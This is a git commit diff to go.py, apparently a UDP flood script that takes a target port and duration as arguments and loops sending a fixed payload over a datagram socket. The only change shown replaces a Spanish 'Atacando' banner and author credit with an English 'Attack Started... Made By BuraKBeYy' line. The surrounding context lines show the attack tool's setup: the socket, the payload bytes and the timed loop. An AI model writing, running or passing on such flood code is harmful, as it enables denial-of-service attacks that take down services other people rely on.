ccbb8f97f7408a37c35a2ef37f272695a2043b59
xPeaceV1 <93834351+xPeaceV1@users.noreply.github.com>
2021-11-06 19:53:38 +0300

    Update go.py

--- go.py
+++ go.py
@@ -7,7 +7,7 @@ puerto = int(sys.argv[2])
 tiempo = time.time() + int(sys.argv[3])
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 payload = "\x30\x30\x30\x30\x34\x30\x30\x30".encode('utf-8')
-print("Atacando... - Made by CxS")
+print("Attack Started... Made By BuraKBeYy")
 while True:
     if time.time() > tiempo:
         break;
